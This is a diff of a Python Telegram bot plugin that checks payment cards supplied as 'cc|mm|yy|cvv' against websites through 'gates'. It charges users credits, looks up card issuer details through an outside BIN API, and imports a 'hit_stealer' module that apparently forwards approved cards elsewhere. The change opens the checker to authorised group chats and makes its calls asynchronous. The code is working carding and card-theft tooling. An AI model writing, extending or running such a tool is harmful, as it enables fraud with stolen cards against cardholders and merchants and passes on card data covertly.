@@ -1,12 +1,13 @@
 from pyrogram import Client, filters
-from datetime import datetime
-import time, re, requests
+from pyrogram.enums import ChatType
+from pyrogram.types import Message
 from plugins.func.users_sql import get_all_custom_gates, fetchinfo, updatedata, plan_expirychk
 from plugins.gates.auto import check_and_add_site
 from plugins.tools.hit_stealer import send_hit_if_approved
+import re, time, httpx
 
-@Client.on_message(filters.text & filters.private, group=1)
-async def handle_dynamic_commands(client, message):
+@Client.on_message(filters.text & (filters.private | filters.group), group=99)
+async def handle_dynamic_commands(client, message: Message):
     user_id = str(message.from_user.id)
     text = message.text.strip()
 
@@ -23,6 +24,12 @@ async def handle_dynamic_commands(client, message):
     if not regdata:
         return await message.reply("❌ You are not registered. Use /register")
 
+    if message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
+        with open("plugins/group.txt") as f:
+            allowed_groups = f.read().splitlines()
+        if str(message.chat.id) not in allowed_groups:
+            return await message.reply("❌ Unauthorized group.")
+
     role = regdata[2].upper() if regdata[2] else "FREE"
     credit = int(regdata[5] or 0)
     wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
@@ -36,12 +43,7 @@ async def handle_dynamic_commands(client, message):
     if now - antispam_time < wait_time:
         return await message.reply(f"⏳ Wait {wait_time - (now - antispam_time)}s")
 
-    cc_raw = None
-    if message.reply_to_message:
-        cc_raw = message.reply_to_message.text or message.reply_to_message.caption
-    elif len(text.split(" ", 1)) > 1:
-        cc_raw = text.split(" ", 1)[1].strip()
-
+    cc_raw = message.reply_to_message.text if message.reply_to_message else text.split(" ", 1)[1] if len(text.split()) > 1 else None
     if not cc_raw:
         return await message.reply(f"❌ No card found.\nUsage: /{command_raw} cc|mm|yy|cvv")
 
@@ -61,23 +63,25 @@ async def handle_dynamic_commands(client, message):
 <b>⊙ Response:</b> Waiting...""")
 
     start = time.perf_counter()
-    success, result_msg, raw_data = check_and_add_site(cc, site_url, email=None, shipping=shipping == "True")
+    success, result_msg, raw_data = await check_and_add_site(cc, site_url, email=None, shipping=shipping == "True")
     duration = time.perf_counter() - start
 
     updatedata(user_id, "credits", credit - 1)
     updatedata(user_id, "antispam_time", now)
     plan_expirychk(user_id)
 
+    # BIN Lookup
     bin_code = cc.split("|")[0][:6]
     try:
-        r = requests.get(f"https://api.voidex.dev/api/bin?bin={bin_code}", timeout=10)
-        b = r.json()
-        brand = b.get("brand", "UNKNOWN").upper()
-        type_ = b.get("type", "N/A").upper()
-        level = b.get("level", "N/A").upper()
-        bank = b.get("bank", "N/A").upper()
-        country = b.get("country_name", "N/A").upper()
-        flag = b.get("country_flag", "🏳️")
+        async with httpx.AsyncClient(timeout=10) as http_client:
+            r = await http_client.get(f"https://api.voidex.dev/api/bin?bin={bin_code}")
+            b = r.json()
+            brand = b.get("brand", "UNKNOWN").upper()
+            type_ = b.get("type", "N/A").upper()
+            level = b.get("level", "N/A").upper()
+            bank = b.get("bank", "N/A").upper()
+            country = b.get("country_name", "N/A").upper()
+            flag = b.get("country_flag", "🏳️")
     except:
         brand = type_ = level = bank = country = "N/A"
         flag = "🏳️"
@@ -108,7 +112,6 @@ async def handle_dynamic_commands(client, message):
 <b>⊙ Time:</b> {duration:.2f}s
 <b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>"""
 
-    # Safe edit: prevents 400 error
     try:
         if checking_msg.text != final_msg:
             await checking_msg.edit(final_msg)
